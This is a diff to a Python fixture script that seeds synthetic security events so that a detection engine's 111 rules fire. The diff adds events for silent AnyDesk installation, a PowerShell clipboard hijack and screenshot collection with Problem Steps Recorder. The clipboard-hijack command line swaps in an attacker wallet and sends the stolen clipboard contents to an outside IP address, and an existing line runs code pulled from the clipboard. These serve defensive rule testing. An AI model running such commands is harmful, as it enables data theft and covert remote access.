@@ -2,7 +2,7 @@
 """Seed one incident that exercises every rule in the corpus.
 
 seed_apt.py tells one attacker's story end to end. This script has a different
-job: it is a regression fixture and a coverage demo, built to fire all 107 rules
+job: it is a regression fixture and a coverage demo, built to fire all 111 rules
 -- across every EventID the engine understands (1, 2, 3, 6, 7, 8, 9, 10, 11,
 12, 13, 15, 17, 20, 22, 23, 25) plus a handful of EventIDs no rule keys on (18,
 19, 21) added purely so the incident's raw event stream and process tree show
@@ -82,6 +82,11 @@ machine. The phases, roughly in kill-chain order:
       │   bypass+hidden PowerShell cradle, mshta named straight in the Run
       │   dialog, and a second-stage PowerShell that pulls its payload back
       │   out of the clipboard (SYS-151 through SYS-154)
+      ├─ coverage-expansion pass 6: a remote-access tool (AnyDesk) dropped
+      │   and installed silently rather than double-clicked, a PowerShell
+      │   clipboard-hijack pattern (read then overwrite), and Problem Steps
+      │   Recorder abused for silent screenshot collection
+      │   (SYS-155 through SYS-158)
       ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
       ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
       ├─ w3wp.exe -> cmd.exe, appcmd.exe                     (SYS-088/038/039)
@@ -124,7 +129,7 @@ EXPECTED_RULES = {
     "SYS-128", "SYS-129", "SYS-130", "SYS-131", "SYS-132", "SYS-133", "SYS-135",
     "SYS-136", "SYS-137", "SYS-138", "SYS-139", "SYS-140", "SYS-141", "SYS-142",
     "SYS-143", "SYS-144", "SYS-148", "SYS-149", "SYS-150", "SYS-151", "SYS-152",
-    "SYS-153", "SYS-154",
+    "SYS-153", "SYS-154", "SYS-155", "SYS-156", "SYS-157", "SYS-158",
 }
 
 
@@ -255,6 +260,10 @@ G = {
     "clickfix_bypass": "{rng-clickfix-bypass}",
     "clickfix_mshta": "{rng-clickfix-mshta}",
     "clickfix_clip": "{rng-clickfix-clip}",
+    # Coverage-expansion pass 6: RMM abuse + collection gaps (SYS-155..158).
+    "rmm_tool": "{rng-rmm-tool}",
+    "clip_hijack": "{rng-clip-hijack}",
+    "psr_capture": "{rng-psr-capture}",
 }
 
 
@@ -826,6 +835,32 @@ def events() -> list[dict]:
                     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     r'powershell -nop -c "iex (Get-Clipboard | Out-String)"',
                     pid=5590, ppid=5570))
+
+    # === Coverage-expansion pass 6: RMM abuse + collection gaps, off "ops" ===
+    # A remote-access tool dropped and silently installed by the dispatcher
+    # rather than double-clicked by a user -- satisfies both the
+    # non-Explorer-parent rule (SYS-155) and the silent-install rule
+    # (SYS-156) from a single install command.
+    ev.append(proc(step(1), G["rmm_tool"], G["ops"],
+                    r"C:\Users\redteam.ops\AppData\Local\Temp\AnyDesk.exe",
+                    "AnyDesk.exe --install --silent --start-with-win",
+                    pid=5600, ppid=4510))
+
+    # A clipboard-hijack ("crypto-clipper") pattern: read what the victim
+    # last copied, then overwrite it before they paste (SYS-157).
+    ev.append(proc(step(1), G["clip_hijack"], G["ops"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r'powershell -c "$c=Get-Clipboard; Set-Clipboard -Value '
+                    r'\'bc1qattackerwallet\'; Invoke-WebRequest -Uri '
+                    r'http://45.132.192.68/clip -Body $c"',
+                    pid=5610, ppid=4510))
+
+    # Problem Steps Recorder abused for silent screenshot collection
+    # (SYS-158).
+    ev.append(proc(step(1), G["psr_capture"], G["ops"], r"C:\Windows\System32\psr.exe",
+                    r"psr.exe /start /gui 0 /output C:\Users\redteam.ops\AppData\Local"
+                    r"\Temp\out.zip",
+                    pid=5620, ppid=4510))
 
     # === FTP LOLBAS execution, off "ops" ===
     ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
